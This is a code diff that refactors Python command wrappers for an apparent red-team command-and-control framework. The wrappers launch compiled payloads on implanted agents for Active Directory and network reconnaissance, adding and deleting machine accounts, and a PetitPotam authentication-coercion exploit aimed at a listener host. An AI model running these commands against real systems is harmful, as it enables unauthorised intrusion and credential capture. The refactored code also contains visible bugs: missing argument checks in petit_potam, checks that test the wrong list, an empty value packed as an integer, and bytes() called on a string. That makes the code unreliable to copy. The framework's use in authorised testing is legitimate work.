@@ -28,6 +28,58 @@ def write_output(notification, file_name: str = "", output_to_console: bool = Tr
         f.close()
     if open_in_notepad: os.startfile(file_name)
 
+def parse_global_params(params):
+    res = []
+    file_name = ""
+    output_to_console = True
+    open_in_notepad = False
+
+    if len(params) > 0:
+        i = 0
+        while i < len(params):
+            param = params[i]
+            name = param.split(" ", 1)[0].lower()
+            if name == "--save-to-file":
+                file_name = params[i+1] if i+1 < len(params) else "out.txt"
+                i += 1
+            elif name == "--suppress-console-output":
+                output_to_console = False
+            elif name == "--notepad":
+                open_in_notepad = True
+            else:
+                res.append(param)
+            i += 1
+    return res, file_name, output_to_console, open_in_notepad
+
+def pack_params(*args):
+    packer = Packer()
+
+    for param in args:
+        if param[0] == "z":
+            packer.addstr(param[1:])
+        elif param[0] == "i":
+            packer.addint32(int(param[1:]))
+        elif param[0] == "b":
+            packer.addbytes(bytes(param[1:]))
+        elif param[0] == "s":
+            packer.addshort(int(param[1:]))
+        elif param[0] == "Z":
+            packer.addwstr(param[1:])
+        else:
+            nighthawk.console_write(CONSOLE_ERROR, f"Error packing parameteres. Unsupported parameter type for {param}")
+            return None
+
+    return packer.getbuffer()
+
+def base_execute_bof(bof_name: str, bof_bin_path: str, save_to_file: str, output_to_console: bool, open_in_notepad: bool, packed_params, info, technique=""):
+    with open(nighthawk.script_resource(f"{bof_bin_path}.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    bin_name = bof_bin_path.rsplit("/", 1)[-1]
+    nighthawk.console_write(CONSOLE_INFO, f"executing {bof_name} BOF")
+    notification = api.execute_bof(f"{bin_name}.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, technique, sync=True)
+    write_output(notification, save_to_file, output_to_console, open_in_notepad)
+    nighthawk.console_write(CONSOLE_INFO, f"Finished executing {bof_name} BOF")
+
 # endregion
 
 # region BOF - ldapsearch
@@ -41,9 +93,6 @@ def ldapsearch_param(params, info):
     dn = ""
     ldaps = False
     skip = False
-    save_to_file = ""
-    output_to_console = True
-    open_in_notepad = False
 
     # Parse args
     if len(params) > 0:
@@ -73,13 +122,6 @@ def ldapsearch_param(params, info):
                 i += 1
             elif option == "--ldaps":
                 ldaps = True
-            elif option == "--save-to-file":
-                save_to_file = value
-                i += 1
-            elif option == "--suppress-console-output":
-                output_to_console = False
-            elif option == "--notepad":
-                open_in_notepad = True
             else:
                 nighthawk.console_write(CONSOLE_ERROR, f"Unknown argument: {arg}")
                 nighthawk.console_write(CONSOLE_ERROR, "Usage: ldapsearch <query> [--attributes] [--count] [--scope] [--hostname] [--dn] [--ldaps] [--save-to-file] [--notepad]")
@@ -87,31 +129,18 @@ def ldapsearch_param(params, info):
             i += 1
 
     # Pack parameters
-    packer = Packer()
-    packer.addstr(query)
-    packer.addstr(attributes)
-    packer.addint32(result_limit)
-    packer.addint32(scope)
-    packer.addstr(hostname)
-    packer.addstr(dn)
-    packer.addbool(ldaps)
-
-    packed_params = packer.getbuffer()
+    packed_params = pack_params(f"z{query}", f"z{attributes}", f"i{result_limit}", f"i{scope}", f"z{hostname}", f"z{dn}", f"i{ldaps}")
 
     # You can now call your static function
     # static_call(packed_params, info)
-    return packed_params, save_to_file, open_in_notepad, output_to_console
+    return packed_params
 
 def ldapsearch(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/ldapsearch/ldapsearch.{info.Agent.ProcessArch}.o"), 'rb') as f: 
-        bof = f.read()
-    packed_params, save_to_file, open_in_notepad, output_to_console = ldapsearch_param(params, info)
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = ldapsearch_param(command_params, info)
     if type(packed_params) != bytes:
         return False
-    nighthawk.console_write(CONSOLE_INFO, "executing ldapserach BOF") 
-    notification = api.execute_bof(f"ldapsearch.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", sync=True)
-    write_output(notification, save_to_file, output_to_console, open_in_notepad)
-    nighthawk.console_write(CONSOLE_INFO, "Finished executing ldapsearch BOF")
+    base_execute_bof("ldapsearch", "bin/SA/ldapsearch/ldapsearch", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(ldapsearch, "ldapsearch", "BOF - Perform LDAP search (avantguard script)" , "BOF - Perform LDAP search (avantguard script)", """ldapsearch <query> [--attributes] [--count] [--scope] [--hostname] [--dn] [--ldaps] [--save-to-file] [--notepad]
 	with :
@@ -139,24 +168,19 @@ THIS IS AN AVANTGUARD SCRIPT""", "ldapsearch (objectclass=domain)")
 # region BOF - netshares & netsharesAdmin
 
 def netshares(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/netshares/netshares.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
     host = ""
     admin = False
-    for i in range(0, len(params)):
-        if (params[i] == "--admin"):
-            host = params[0]
-        else:
+    for i in range(0, len(command_params)):
+        if (command_params[i] == "--admin"):
             admin = True
-    packer = Packer()
-    packer.addwstr(host)
-    packer.addbool(admin)
-    packed_params = packer.getbuffer()
+        else:
+            host = command_params[i]
+    
+    packed_params = pack_params(f"Z{host}", f"i{admin}")
     if type(packed_params) != bytes:
         return False
-    nighthawk.console_write(CONSOLE_INFO, "executing netshares BOF")
-    notification = api.execute_bof(f"netshares.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", sync=True)
-    write_output(notification)
+    base_execute_bof("netshares", "bin/SA/netshares/netshares", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(netshares, "netshares", "BOF - list shares on local or remote computer (avantguard script)" , "BOF - list shares on local or remote computer (avantguard script)", """netshares <\\\\computername> <--admin>
 with --admin it finds more info then standard netshares but requires admin
@@ -168,23 +192,12 @@ THIS IS AN AVANTGUARD SCRIPT""", "netshares \\\\ws21")
 # region BOF - adcs_enum
 
 def adcs_enum(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/adcs_enum/adcs_enum.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    domain = ""
-    open_in_notepad = False
-    for param in params:
-        if param == "--notepad":
-            open_in_notepad = True
-        else:
-            domain = param
-    packer = Packer()
-    packer.addwstr(domain)
-    packed_params = packer.getbuffer()
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    domain = command_params[0] if len(command_params) > 0 else ""
+    packed_params = pack_params(f"Z{domain}")
     if type(packed_params) != bytes:
         return False
-    nighthawk.console_write(CONSOLE_INFO, "executing adcs_enum BOF")
-    notification = api.execute_bof(f"adcs_enum.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", sync=True)
-    write_output(notification, open_in_notepad=open_in_notepad)
+    base_execute_bof("adcs_enum", "bin/SA/adcs_enum/adcs_enum", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(adcs_enum, "adcs_enum", "BOF - Enumerates CAs and templates in the AD using Win32 functions (avantguard script)" , "BOF - Enumerates CAs and templates in the AD using Win32 functions (avantguard script)", """adcs_enum <domain> [--notepad]
 Summary: This command enumerates the certificate authorities and certificate 
@@ -202,23 +215,12 @@ THIS IS AN AVANTGUARD SCRIPT""", "adcs_enum CONTOSO.com")
 # region BOF - adcs_enum_com
 
 def adcs_enum_com(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/adcs_enum_com/adcs_enum_com.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    open_in_notepad = False
-    for param in params:
-        if param == "--notepad":
-            open_in_notepad = True
-
-    packer = Packer()
-    packed_params = packer.getbuffer()  # no parameters for this one
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()  # no parameters for this one
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing adcs_enum_com BOF")
-    notification = api.execute_bof(f"adcs_enum_com.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", sync=True)
-    write_output(notification, open_in_notepad=open_in_notepad)
+    base_execute_bof("adcs_enum_com", "bin/SA/adcs_enum_com/adcs_enum_com", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     adcs_enum_com,
@@ -242,23 +244,12 @@ THIS IS AN AVANTGUARD SCRIPT""",
 # region BOF - adcs_enum_com2
 
 def adcs_enum_com2(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/adcs_enum_com2/adcs_enum_com2.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    open_in_notepad = False
-    for param in params:
-        if param == "--notepad":
-            open_in_notepad = True
-
-    packer = Packer()
-    packed_params = packer.getbuffer()  # no parameters for this one either
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()  # no parameters for this one
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing adcs_enum_com2 BOF")
-    notification = api.execute_bof(f"adcs_enum_com2.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", sync=True)
-    write_output(notification, open_in_notepad=open_in_notepad)
+    base_execute_bof("adcs_enum_com2", "bin/SA/adcs_enum_com2/adcs_enum_com2", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     adcs_enum_com2,
@@ -284,15 +275,12 @@ THIS IS AN AVANTGUARD SCRIPT""",
 # region BOF - routeprint
 
 def routeprint(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/routeprint/routeprint.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    packer = Packer()
-    packed_params = packer.getbuffer()
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()  # no parameters for this one
     if type(packed_params) != bytes:
         return False
-    nighthawk.console_write(CONSOLE_INFO, "executing routeprint BOF")
-    notification = api.execute_bof(f"routeprint.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", sync=True)
-    write_output(notification)
+
+    base_execute_bof("routeprint", "bin/SA/routeprint/routeprint", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(routeprint, "routeprint", "BOF - prints ipv4 routes on the machine (avantguard script)", "BOF - prints ipv4 routes on the machine (avantguard script)", """prints ipv4 routes on the machine
 
@@ -303,28 +291,12 @@ THIS IS AN AVANTGUARD SCRIPT""", "routeprint ")
 # region BOF - ipconfig
 
 def ipconfig(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/ipconfig/ipconfig.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    packer = Packer()
-    packed_params = packer.getbuffer()  # no parameters for ipconfig
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()  # no parameters for this one
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing ipconfig BOF")
-    notification = api.execute_bof(
-        f"ipconfig.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "T1016",  # matches the MITRE technique from original
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("ipconfig", "bin/SA/ipconfig/ipconfig", save_to_file, output_to_console, open_in_notepad, packed_params, info, technique="T1016")
 
 nighthawk.register_command(
     ipconfig,
@@ -347,39 +319,15 @@ def netGroupList(params, info):
     """
     Lists groups in this domain (or a specified domain if provided)
     """
-    with open(nighthawk.script_resource(f"bin/SA/netgroup/netgroup.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    domain = ""
-    open_in_notepad = False
-    for param in params:
-        if param == "--notepad":
-            open_in_notepad = True
-        else:
-            domain = param
-
-    packer = Packer()
-    packer.addshort(0)         # type = 0 (list groups)
-    packer.addwstr(domain)     # domain
-    packer.addwstr("")         # group (empty)
-    packed_params = packer.getbuffer()
-
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    type_param = 0 # type == 0 (list groups)
+    domain = command_params[0] if len(command_params) > 0 else ""
+    group = "" # group is empty
+    packed_params = pack_params(f"s{type_param}", f"Z{domain}", f"Z{group}")
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing netGroupList BOF")
-    notification = api.execute_bof(
-        f"netgroup.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification, open_in_notepad=open_in_notepad)
+    base_execute_bof("netGroupList", "bin/SA/netgroup/netgroup", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     netGroupList,
@@ -399,42 +347,15 @@ def netGroupListMembers(params, info):
     """
     Lists members of the specified domain group
     """
-    with open(nighthawk.script_resource(f"bin/SA/netgroup/netgroup.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    group = ""
-    domain = ""
-    for param in params:
-        if param == "--notepad":
-            open_in_notepad = True
-        else:
-            if group == "":
-                group = param
-            else:
-                domain = param
-
-    packer = Packer()
-    packer.addshort(1)         # type = 1 (list members)
-    packer.addwstr(domain)
-    packer.addwstr(group)
-    packed_params = packer.getbuffer()
-
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    type_param = 1 # type == 1 (list members)
+    group = command_params[0] if len(command_params) > 0 else ""
+    domain = command_params[1] if len(command_params) > 1 else ""
+    packed_params = pack_params(f"s{type_param}", f"Z{domain}", f"Z{group}")
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing netGroupListMembers BOF")
-    notification = api.execute_bof(
-        f"netgroup.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification, open_in_notepad=open_in_notepad)
+    base_execute_bof("netGroupListMembers", "bin/SA/netgroup/netgroup", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 
 nighthawk.register_command(
@@ -458,35 +379,15 @@ def netLocalGroupList(params, info):
     """
     Lists groups in the local server (or specified server if given)
     """
-    with open(nighthawk.script_resource(f"bin/SA/netlocalgroup/netlocalgroup.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    server = ""
-    if len(params) > 0:
-        server = params[0]
-
-    packer = Packer()
-    packer.addshort(0)         # type = 0 (list groups)
-    packer.addwstr(server)
-    packer.addwstr("")         # group (empty)
-    packed_params = packer.getbuffer()
-
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    type_param = 0 # type == 0 (list groups)
+    server = command_params[0] if len(command_params) > 0 else ""
+    group = "" # group is empty
+    packed_params = pack_params(f"s{type_param}", f"Z{server}", f"Z{group}")
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing netLocalGroupList BOF")
-    notification = api.execute_bof(
-        f"netlocalgroup.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("netLocalGroupList", "bin/SA/netlocalgroup/netlocalgroup", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     netLocalGroupList,
@@ -505,38 +406,15 @@ def netLocalGroupListMembers(params, info):
     """
     Lists members of the specified local group
     """
-    with open(nighthawk.script_resource(f"bin/SA/netlocalgroup/netlocalgroup.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    group = ""
-    server = ""
-    if len(params) > 0:
-        group = params[0]
-    if len(params) > 1:
-        server = params[1]
-
-    packer = Packer()
-    packer.addshort(1)         # type = 1 (list members)
-    packer.addwstr(server)
-    packer.addwstr(group)
-    packed_params = packer.getbuffer()
-
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    type_param = 1 # type == 1 (list members)
+    server = command_params[1] if len(command_params) > 1 else ""
+    group = command_params[0] if len(command_params) > 0 else ""
+    packed_params = pack_params(f"s{type_param}", f"Z{server}", f"Z{group}")
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing netLocalGroupListMembers BOF")
-    notification = api.execute_bof(
-        f"netlocalgroup.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("netLocalGroupListMembers", "bin/SA/netlocalgroup/netlocalgroup", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     netLocalGroupListMembers,
@@ -559,37 +437,16 @@ def netLocalGroupListMembers2(params, info):
     """
     Lists members of the specified local group (bofhound-compatible output)
     """
-    with open(nighthawk.script_resource(f"bin/SA/netlocalgroup2/netlocalgroup2.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    type_param = 1 # type == 1 (list members)
+    server = command_params[1] if len(command_params) > 1 else ""
+    group = command_params[0] if len(command_params) > 0 else ""
 
-    group = ""
-    server = ""
-    if len(params) > 0:
-        group = params[0]
-    if len(params) > 1:
-        server = params[1]
-
-    packer = Packer()
-    packer.addwstr(server)
-    packer.addwstr(group)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"s{type_param}", f"Z{server}", f"Z{group}")
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing netLocalGroupListMembers2 BOF")
-    notification = api.execute_bof(
-        f"netlocalgroup2.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("netLocalGroupListMembers2", "bin/SA/netlocalgroup2/netlocalgroup2", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     netLocalGroupListMembers2,
@@ -613,10 +470,8 @@ def reg_query(params, info):
     """
     Queries a registry key or value (optionally remote).
     """
-    with open(nighthawk.script_resource(f"bin/SA/reg_query/reg_query.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    if len(params) < 2:
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 2:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: reg_query [hostname] <hive> <path> [value]")
         return False
 
@@ -635,50 +490,31 @@ def reg_query(params, info):
     recursive_flag = 0
 
     # Determine if first argument is hostname or hive
-    if params[0].upper() in reghives:
+    if command_params[0].upper() in reghives:
         # Local machine
         hostname = ""
-        hive = reghives[params[0].upper()]
-        if len(params) >= 2:
-            path = params[1]
-        if len(params) >= 3:
-            key = params[2]
+        hive = reghives[command_params[0].upper()]
+        if len(command_params) >= 2:
+            path = command_params[1]
+        if len(command_params) >= 3:
+            key = command_params[2]
     else:
         # Remote host
-        hostname = f"\\\\{params[0]}"
-        if len(params) < 2 or params[1].upper() not in reghives:
+        hostname = f"\\\\{command_params[0]}"
+        if len(command_params) < 2 or command_params[1].upper() not in reghives:
             nighthawk.console_write(CONSOLE_ERROR, "Invalid or missing hive name.")
             return False
-        hive = reghives[params[1].upper()]
-        if len(params) >= 3:
-            path = params[2]
-        if len(params) >= 4:
-            key = params[3]
+        hive = reghives[command_params[1].upper()]
+        if len(command_params) >= 3:
+            path = command_params[2]
+        if len(command_params) >= 4:
+            key = command_params[3]
 
-    packer = Packer()
-    packer.addstr(hostname)
-    packer.addint32(hive)
-    packer.addstr(path)
-    packer.addstr(key)
-    packer.addint32(recursive_flag)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{hostname}", f"i{hive}", f"z{path}", f"z{key}", f"i{recursive_flag}")
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing reg_query BOF")
-    notification = api.execute_bof(
-        f"reg_query.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("reg_query", "bin/SA/reg_query/reg_query", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     reg_query,
@@ -705,10 +541,8 @@ def reg_query_recursive(params, info):
     """
     Recursively queries registry keys (optionally remote).
     """
-    with open(nighthawk.script_resource(f"bin/SA/reg_query/reg_query.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    if len(params) < 2:
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 2:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: reg_query_recursive [hostname] <hive> <path>")
         return False
 
@@ -724,45 +558,26 @@ def reg_query_recursive(params, info):
     path = ""
     recursive_flag = 1  # indicates recursion mode
 
-    if params[0].upper() in reghives:
+    if command_params[0].upper() in reghives:
         # Local
-        hive = reghives[params[0].upper()]
-        if len(params) >= 2:
-            path = params[1]
+        hive = reghives[command_params[0].upper()]
+        if len(command_params) >= 2:
+            path = command_params[1]
     else:
         # Remote
-        hostname = f"\\\\{params[0]}"
-        if len(params) < 2 or params[1].upper() not in reghives:
+        hostname = f"\\\\{command_params[0]}"
+        if len(command_params) < 2 or command_params[1].upper() not in reghives:
             nighthawk.console_write(CONSOLE_ERROR, "Invalid or missing hive name.")
             return False
-        hive = reghives[params[1].upper()]
-        if len(params) >= 3:
-            path = params[2]
+        hive = reghives[command_params[1].upper()]
+        if len(command_params) >= 3:
+            path = command_params[2]
 
-    packer = Packer()
-    packer.addstr(hostname)
-    packer.addint32(hive)
-    packer.addstr(path)
-    packer.addstr("")
-    packer.addint32(recursive_flag)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{hostname}", f"i{hive}", f"z{path}", "s", f"i{recursive_flag}")
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing reg_query_recursive BOF")
-    notification = api.execute_bof(
-        f"reg_query.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("reg_query_recursive", "bin/SA/reg_query/reg_query", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     reg_query_recursive,
@@ -790,28 +605,12 @@ THIS IS AN AVANTGUARD SCRIPT""",
 # region BOF - enumLocalSessions
 
 def enumlocalsessions(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/enumlocalsessions/enumlocalsessions.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
-    packer = Packer()
-    packed_params = packer.getbuffer()  # no parameters for ipconfig
-
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing enumlocalsessions BOF")
-    notification = api.execute_bof(
-        f"enumlocalsessions.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "", 
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("enumlocalsessions", "bin/SA/enumlocalsessions/enumlocalsessions", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     enumlocalsessions,
@@ -831,14 +630,12 @@ THIS IS AN AVANTGUARD SCRIPT""",
 # region BOF - probe
 
 def probe(params, info):
-    with open(nighthawk.script_resource(f"bin/SA/probe/probe.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
     port = 0
     server = ""
-    if len(params) > 1:
-        server = params[0]
-        port = int(params[1])
+    if len(command_params) > 1:
+        server = command_params[0]
+        port = int(command_params[1])
     else:
         nighthawk.console_write(CONSOLE_ERROR, f"!! Usage:   probe <host> <port>")
         return False
@@ -847,27 +644,11 @@ def probe(params, info):
         nighthawk.console_write(CONSOLE_ERROR, f"!! Port out of range of 1-65534")
         return False
 
-    packer = Packer()
-    packer.addstr(server)
-    packer.addint32(port)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{server}", f"i{port}")
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing probe BOF")
-    notification = api.execute_bof(
-        f"probe.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("probe", "bin/SA/probe/probe", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     probe,
@@ -949,36 +730,18 @@ def add_machine_account(params, info):
     """
     Add a computer account to the Active Directory domain.
     """
-
-    if len(params) < 2:
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 2:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: add_machine_account <computername> <password>")
         return False
 
-    computerName = params[0]
-    password = params[1]
-    packer = Packer()
-    packer.addstr(computerName)
-    packer.addstr(password)
-    packed_params = packer.getbuffer()
-
+    computerName = command_params[0]
+    password = command_params[1]
+    packed_params = pack_params(f"z{computerName}", f"z{password}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/MachineAccount/AddMachineAccount/AddMachineAccount.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing AddMachineAccount BOF")
-    notification = api.execute_bof(
-        f"AddMachineAccount.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("AddMachineAccount", "bin/MachineAccount/AddMachineAccount/AddMachineAccount", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     add_machine_account,
@@ -997,33 +760,17 @@ def del_machine_account(params, info):
     """
     Remove a computer account from the Active Directory domain.
     """
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
     if len(params) < 1:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: del_machine_account <computername>")
         return False
 
-    computerName = params[0]
-    packer = Packer()
-    packer.addstr(computerName)
-    packed_params = packer.getbuffer()
-
+    computerName = command_params[0]
+    packed_params = pack_params(f"z{computerName}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/MachineAccount/DelMachineAccount/DelMachineAccount.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing DelMachineAccount BOF")
-    notification = api.execute_bof(
-        f"DelMachineAccount.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("DelMachineAccount", "bin/MachineAccount/DelMachineAccount/DelMachineAccount", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     del_machine_account,
@@ -1042,27 +789,12 @@ def get_machine_account_quota(params, info):
     """
     Read the MachineAccountQuota value from the Active Directory domain.
     """
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/MachineAccount/GetMachineAccountQuota/GetMachineAccountQuota.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing GetMachineAccountQuota BOF")
-    notification = api.execute_bof(
-        f"GetMachineAccountQuota.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("GetMachineAccountQuota", "bin/MachineAccount/GetMachineAccountQuota/GetMachineAccountQuota", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     get_machine_account_quota,
@@ -1085,36 +817,14 @@ def petit_potam(params, info):
     """
     Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability.
     """
-
-    if len(params) < 2:
-        nighthawk.console_write(CONSOLE_ERROR, "Usage: petit_potam <targetMachine> <listenerMachine>")
-        return False
-
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
     target_machine = params[0]
     listener_machine = params[1]
-    packer = Packer()
-    packer.addstr(target_machine)
-    packer.addstr(listener_machine)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{target_machine}", f"z{listener_machine}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Exploit/PetitPotam/PetitPotam.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing PetitPotam BOF")
-    notification = api.execute_bof(
-        f"PetitPotam.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("PetitPotam", "bin/Exploit/PetitPotam/PetitPotam", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     petit_potam,
@@ -1137,35 +847,12 @@ def always_install_elevated_check(params, info):
     """
     Check for AlwaysInstallElevated privilege escalation vulnerability.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
